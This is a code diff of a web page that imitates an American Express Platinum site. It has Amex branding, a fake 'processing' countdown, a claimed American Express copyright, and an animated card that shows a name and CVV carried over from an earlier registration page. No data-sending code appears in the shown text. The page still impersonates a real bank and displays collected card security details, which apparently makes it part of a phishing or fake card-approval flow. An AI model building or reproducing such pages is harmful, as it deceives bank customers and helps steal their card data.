@@ -1,16 +1,17 @@
-<!-- second.html -->
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
 <title>American Express Platinum</title>
 
 <style>
+
 :root{
     --amex-blue:#00175a;
     --amex-light:#0070d5;
-    --bg:#f5f7fb;
 }
 
 *{
@@ -20,33 +21,40 @@
 }
 
 body{
-    font-family: "Helvetica Neue", Arial, sans-serif;
-    background: linear-gradient(135deg,#eef2ff,#f5f7fb);
+    font-family:Arial, Helvetica, sans-serif;
+    background:
+    radial-gradient(circle at top,#ffffff,#eef2ff 45%,#dde7ff);
     min-height:100vh;
     overflow-x:hidden;
 }
 
 /* NAVBAR */
+
 nav{
+    width:100%;
     background:#fff;
-    padding:12px 5%;
+    border-bottom:1px solid #ddd;
+    padding:14px 5%;
     display:flex;
     align-items:center;
-    border-bottom:1px solid #ddd;
     gap:30px;
 }
 
 .amex-logo-box{
-    background:var(--amex-blue);
+
+    /* ORIGINAL DARK BLUE */
+
+    background:#00175a;
+
     color:#fff;
     padding:8px 12px;
-    font-weight:bold;
     font-size:13px;
+    font-weight:700;
     line-height:1.1;
-    text-transform:uppercase;
-    text-align:center;
-    min-width:80px;
     border-radius:2px;
+    text-align:center;
+    min-width:85px;
+    letter-spacing:1px;
 }
 
 .nav-links{
@@ -57,16 +65,18 @@ nav{
 
 .nav-links a{
     text-decoration:none;
-    color:#333;
+    color:#222;
+    font-size:15px;
     font-weight:500;
 }
 
 .login-btn{
-    background:#f0f0f0;
     border:1px solid #ccc;
-    padding:8px 20px;
-    font-weight:bold;
+    background:#f7f7f7;
+    padding:10px 22px;
     cursor:pointer;
+    font-weight:bold;
+    border-radius:5px;
 }
 
 /* PROCESSING SCREEN */
@@ -74,8 +84,9 @@ nav{
 .processing-screen{
     position:fixed;
     inset:0;
-    background:linear-gradient(135deg,#eef2ff,#f5f7fb);
-    z-index:9999;
+    z-index:99999;
+    background:
+    linear-gradient(135deg,#f5f8ff,#edf2ff);
     display:flex;
     align-items:center;
     justify-content:center;
@@ -89,13 +100,13 @@ nav{
 }
 
 .loader{
-    width:90px;
-    height:90px;
+    width:95px;
+    height:95px;
+    border-radius:50%;
     border:7px solid rgba(0,0,0,0.08);
     border-top:7px solid var(--amex-blue);
-    border-radius:50%;
     animation:spin 1s linear infinite;
-    margin-bottom:25px;
+    margin-bottom:30px;
 }
 
 @keyframes spin{
@@ -105,34 +116,35 @@ nav{
 }
 
 .processing-text{
-    font-size:30px;
-    font-weight:700;
+    font-size:32px;
     color:var(--amex-blue);
-    margin-bottom:15px;
+    font-weight:700;
+    margin-bottom:14px;
     text-align:center;
 }
 
 .processing-subtext{
-    color:#555;
     font-size:16px;
-    margin-bottom:20px;
+    color:#555;
+    margin-bottom:24px;
     text-align:center;
 }
 
 .timer{
-    font-size:55px;
+    font-size:58px;
     font-weight:bold;
     color:#111;
 }
 
 /* MAIN */
+
 .wrapper{
     width:100%;
-    min-height:calc(100vh - 150px);
+    min-height:calc(100vh - 90px);
     display:flex;
     align-items:center;
     justify-content:center;
-    padding:50px 20px;
+    padding:60px 20px;
     opacity:0;
     transition:1s;
 }
@@ -142,77 +154,172 @@ nav{
 }
 
 .card-container{
-    perspective:1500px;
+    perspective:2500px;
 }
+
+/* CARD */
 
 .card{
     width:430px;
     height:270px;
     position:relative;
     transform-style:preserve-3d;
-    transition:1s;
+    transition:transform 1.3s cubic-bezier(.4,.2,.2,1);
     cursor:pointer;
+
+    animation:
+    floatCard 5s ease-in-out infinite,
+    shadowPulse 4s ease-in-out infinite;
 }
 
-.card.flipped{
-    transform:rotateY(180deg);
+/* FLOATING */
+
+@keyframes floatCard{
+
+    0%{
+        transform:
+        translateY(0px)
+        rotateX(0deg);
+    }
+
+    50%{
+        transform:
+        translateY(-10px)
+        rotateX(2deg);
+    }
+
+    100%{
+        transform:
+        translateY(0px)
+        rotateX(0deg);
+    }
+}
+
+/* REAL SHADOW */
+
+@keyframes shadowPulse{
+
+    0%{
+        filter:drop-shadow(0 18px 28px rgba(0,0,0,0.18));
+    }
+
+    50%{
+        filter:drop-shadow(0 28px 45px rgba(0,23,90,0.28));
+    }
+
+    100%{
+        filter:drop-shadow(0 18px 28px rgba(0,0,0,0.18));
+    }
 }
 
 .card-face{
     position:absolute;
     width:100%;
     height:100%;
-    border-radius:22px;
+    border-radius:24px;
     overflow:hidden;
     backface-visibility:hidden;
-    box-shadow:0 20px 45px rgba(0,0,0,0.25);
+
+    box-shadow:
+    0 20px 45px rgba(0,0,0,0.22);
 }
 
 /* FRONT */
+
 .card-front{
-    background:url("Platinum_Card_new.png") center/cover no-repeat;
-    color:#000;
+    background:
+    url("Platinum_Card_new.png")
+    center/cover no-repeat;
 }
+
+/* GLASS OVERLAY */
 
 .overlay{
     position:absolute;
     inset:0;
-    background:rgba(255,255,255,0.05);
+
+    background:
+    linear-gradient(
+        135deg,
+        rgba(255,255,255,0.16),
+        rgba(255,255,255,0.03)
+    );
+}
+
+/* SHINE EFFECT */
+
+.card-front::before{
+    content:"";
+    position:absolute;
+    top:-180%;
+    left:-50%;
+    width:60%;
+    height:380%;
+
+    background:
+    linear-gradient(
+        90deg,
+        transparent,
+        rgba(255,255,255,0.25),
+        transparent
+    );
+
+    transform:rotate(25deg);
+
+    animation:shine 5s linear infinite;
+}
+
+@keyframes shine{
+
+    0%{
+        left:-60%;
+    }
+
+    100%{
+        left:160%;
+    }
 }
 
 .card-number{
     position:absolute;
-    bottom:85px;
+    bottom:86px;
     left:35px;
+
     font-size:26px;
     letter-spacing:3px;
     font-weight:600;
+
     color:#111;
-    text-shadow:0 1px 2px rgba(255,255,255,0.5);
+
+    text-shadow:
+    0 1px 3px rgba(255,255,255,0.6);
 }
 
 .card-name{
     position:absolute;
-    bottom:40px;
+    bottom:42px;
     left:35px;
+
     font-size:28px;
-    text-transform:uppercase;
     font-weight:500;
+    text-transform:uppercase;
+
     color:#111;
 }
 
 .expiry{
     position:absolute;
-    bottom:43px;
     right:40px;
+    bottom:45px;
+
     text-align:right;
     color:#111;
 }
 
 .expiry span{
-    font-size:12px;
-    display:block;
+    font-size:11px;
     font-weight:bold;
+    display:block;
 }
 
 .expiry h3{
@@ -221,10 +328,17 @@ nav{
 }
 
 /* BACK */
+
 .card-back{
-    background:linear-gradient(135deg,#cfd4da,#8f969f);
+
     transform:rotateY(180deg);
-    color:#111;
+
+    background:
+    linear-gradient(
+        135deg,
+        #d0d5db,
+        #8f98a2
+    );
 }
 
 .black-strip{
@@ -237,10 +351,15 @@ nav{
 .cvv-box{
     width:85%;
     background:#fff;
+
     margin:35px auto 0;
-    padding:15px;
+
+    padding:14px;
+
     border-radius:8px;
+
     text-align:right;
+
     font-size:28px;
     font-weight:bold;
     letter-spacing:5px;
@@ -248,47 +367,72 @@ nav{
 
 .back-text{
     width:85%;
-    margin:20px auto;
+    margin:18px auto;
+
     font-size:12px;
     line-height:1.5;
+
     color:#222;
 }
 
-/* BUTTONS */
+/* ACTION */
+
 .actions{
-    margin-top:35px;
+    margin-top:38px;
     display:flex;
-    gap:15px;
     justify-content:center;
-    flex-wrap:wrap;
 }
 
 .btn{
-    padding:14px 28px;
+    padding:16px 42px;
+
     border:none;
-    border-radius:50px;
-    background:var(--amex-blue);
+    border-radius:60px;
+
+    background:
+    linear-gradient(
+        135deg,
+        var(--amex-blue),
+        #003ca3
+    );
+
     color:#fff;
-    font-weight:bold;
-    cursor:pointer;
-    transition:0.3s;
     font-size:15px;
+    font-weight:bold;
+
+    text-decoration:none;
+
+    transition:0.35s;
+
+    box-shadow:
+    0 12px 25px rgba(0,23,90,0.25);
 }
 
 .btn:hover{
-    transform:translateY(-2px);
-    background:var(--amex-light);
+
+    transform:
+    translateY(-3px)
+    scale(1.03);
+
+    background:
+    linear-gradient(
+        135deg,
+        var(--amex-light),
+        #0059c1
+    );
 }
 
 /* FOOTER */
+
 footer{
     text-align:center;
+    padding:22px 10px;
     color:#888;
     font-size:13px;
-    padding:25px 10px;
 }
 
 /* MOBILE */
+
 @media(max-width:500px){
 
     .card{
@@ -298,7 +442,7 @@ footer{
 
     .card-number{
         font-size:20px;
-        bottom:70px;
+        bottom:68px;
     }
 
     .card-name{
@@ -322,9 +466,10 @@ footer{
     }
 
     .timer{
-        font-size:45px;
+        font-size:46px;
     }
 }
+
 </style>
 </head>
 
@@ -350,8 +495,10 @@ footer{
 
 </div>
 
-<!-- HEADER -->
+<!-- NAVBAR -->
+
 <nav>
+
     <div class="amex-logo-box">
         AMERICAN<br>EXPRESS
     </div>
@@ -363,18 +510,24 @@ footer{
         <a href="#">Insurance</a>
     </div>
 
-    <button class="login-btn">Log In</button>
+    <button class="login-btn">
+        Log In
+    </button>
+
 </nav>
 
-<!-- CARD -->
+<!-- MAIN -->
+
 <div class="wrapper" id="mainWrapper">
 
     <div>
 
         <div class="card-container">
+
             <div class="card" id="card">
 
                 <!-- FRONT -->
+
                 <div class="card-face card-front">
 
                     <div class="overlay"></div>
@@ -383,8 +536,7 @@ footer{
                         3797 2200 0000 001
                     </div>
 
-                    <div class="card-name" id="cardName">
-                    </div>
+                    <div class="card-name" id="cardName"></div>
 
                     <div class="expiry">
                         <span>MEMBER SINCE / EXP</span>
@@ -394,6 +546,7 @@ footer{
                 </div>
 
                 <!-- BACK -->
+
                 <div class="card-face card-back">
 
                     <div class="black-strip"></div>
@@ -411,12 +564,21 @@ footer{
                 </div>
 
             </div>
+
         </div>
 
+        <!-- BUTTON -->
+
         <div class="actions">
-            <button class="btn" id="flipBtn">
-                Flip Card
-            </button>
+
+            <a
+            href="https://example.com"
+            class="btn">
+
+                Proceed
+
+            </a>
+
         </div>
 
     </div>
@@ -424,6 +586,7 @@ footer{
 </div>
 
 <!-- FOOTER -->
+
 <footer>
     Copyright © 2026 American Express Banking Corp.
 </footer>
@@ -447,6 +610,11 @@ document.getElementById("processingScreen");
 const mainWrapper =
 document.getElementById("mainWrapper");
 
+const card =
+document.getElementById("card");
+
+let flipped = false;
+
 const countdown = setInterval(() => {
 
     timeLeft--;
@@ -464,13 +632,33 @@ const countdown = setInterval(() => {
 
         mainWrapper.classList.add("show");
 
+        /*
+        ============================================
+        AUTO ONE TIME FLIP
+        ============================================
+        */
+
+        setTimeout(() => {
+
+            card.style.transform =
+            "rotateY(180deg)";
+
+        },1000);
+
+        setTimeout(() => {
+
+            card.style.transform =
+            "rotateY(0deg)";
+
+        },3200);
+
     }
 
 },1000);
 
 /*
 =====================================================
-DATA FROM registration.html
+GET DATA
 =====================================================
 */
 
@@ -515,29 +703,24 @@ cvv;
 
 /*
 =====================================================
-FLIP CARD
-=====================================================
-*/
-
-const card =
-document.getElementById("card");
-
-document.getElementById("flipBtn")
-.addEventListener("click", () => {
-
-    card.classList.toggle("flipped");
-
-});
-
-/*
-=====================================================
-AUTO FLIP ON CLICK
+MANUAL CLICK / MOBILE TAP FLIP
 =====================================================
 */
 
 card.addEventListener("click", () => {
 
-    card.classList.toggle("flipped");
+    flipped = !flipped;
+
+    if(flipped){
+
+        card.style.transform =
+        "rotateY(180deg)";
+
+    }else{
+
+        card.style.transform =
+        "rotateY(0deg)";
+    }
 
 });
 
